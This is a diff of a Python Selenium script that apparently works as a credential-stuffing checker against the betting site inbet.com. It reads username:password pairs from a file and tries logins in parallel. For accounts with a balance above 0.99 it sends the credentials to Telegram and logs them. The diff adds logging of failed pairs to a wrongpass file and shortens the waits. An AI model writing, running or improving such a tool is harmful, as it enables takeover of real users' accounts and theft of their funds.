@@ -18,6 +18,8 @@ import keyboard
 import requests
 import multiprocessing
 
+wrongpass_file = r"C:\Inbet\wrongpass.txt"
+
 stop_flag = False
 max_workers = 10
 headless_mode = True
@@ -86,7 +88,7 @@ def login(credentials):
     driver = init_driver()
     try:
         driver.get(login_page_url)
-        wait = WebDriverWait(driver, 30)
+        wait = WebDriverWait(driver, 10)
 
         try:
             allow_all_btn = wait.until(
@@ -101,10 +103,12 @@ def login(credentials):
                 driver.execute_script("arguments[0].click();", allow_all_btn)
         except Exception:
             print(f"[WARNING] 'Allow All Cookies' button not found for {username}. Continuing...")
-            
+
         try:
             login_button = wait.until(
-                EC.element_to_be_clickable((By.XPATH, "/html/body/div[3]/div[2]/div[1]/nav/div/div/div[3]/div/button[2]"))
+                EC.element_to_be_clickable(
+                    (By.XPATH, "/html/body/div[3]/div[2]/div[1]/nav/div/div/div[3]/div/button[2]")
+                )
             )
             driver.execute_script("arguments[0].click();", login_button)
         except:
@@ -146,7 +150,7 @@ def login(credentials):
 
         formatted_amount = '0.00'
         balance_found = False
-        time.sleep(50)
+
         try:
             success_elm = wait.until(
                 EC.visibility_of_element_located(
@@ -169,17 +173,29 @@ def login(credentials):
         balance_value = float(formatted_amount.replace(',', '.'))
         if balance_value > 0.99:
             try:
-                winsound.PlaySound(r"C:\Users\petar\Desktop\inbet\inbet.wav",
-                                   winsound.SND_FILENAME | winsound.SND_ASYNC)
+                winsound.PlaySound(
+                    r"C:\Inbet\inbet.wav",
+                    winsound.SND_FILENAME | winsound.SND_ASYNC
+                )
             except:
                 print("[WARNING] Could not play sound.")
             timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
             send_telegram(username, password, formatted_amount, timestamp)
 
         if balance_found:
+            # Успешен логин -> запис в balance.txt
             timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
             with open(success_logins_file, 'a', encoding='utf-8') as file:
                 file.write(f"[{timestamp}] {username}:{password} - Balance: {formatted_amount}\n")
+        else:
+            # Save to wrongpass.txt
+            try:
+                os.makedirs(os.path.dirname(wrongpass_file), exist_ok=True)
+                with open(wrongpass_file, "a", encoding="utf-8") as f:
+                    f.write(f"{username}:{password}\n")
+                print(f"[INFO] Saved wrong credentials for {username} to wrongpass.txt")
+            except Exception as e:
+                print(f"[ERROR] Failed to write to wrongpass.txt: {e}")
 
     except Exception:
         traceback.print_exc()
@@ -218,8 +234,9 @@ def main():
     config_popup()
 
     credentials_file = 'unique.txt'
-    success_logins_file = r"C:\Users\petar\Desktop\inbet\balance_and_bets_sounds.txt"
+    success_logins_file = r"C:\Inbet\balance_and_bets_sounds.txt"
     os.makedirs(os.path.dirname(success_logins_file), exist_ok=True)
+    os.makedirs(os.path.dirname(wrongpass_file), exist_ok=True)
 
     login_page_url = "https://www.inbet.com/sports"
     credentials = read_credentials(credentials_file)
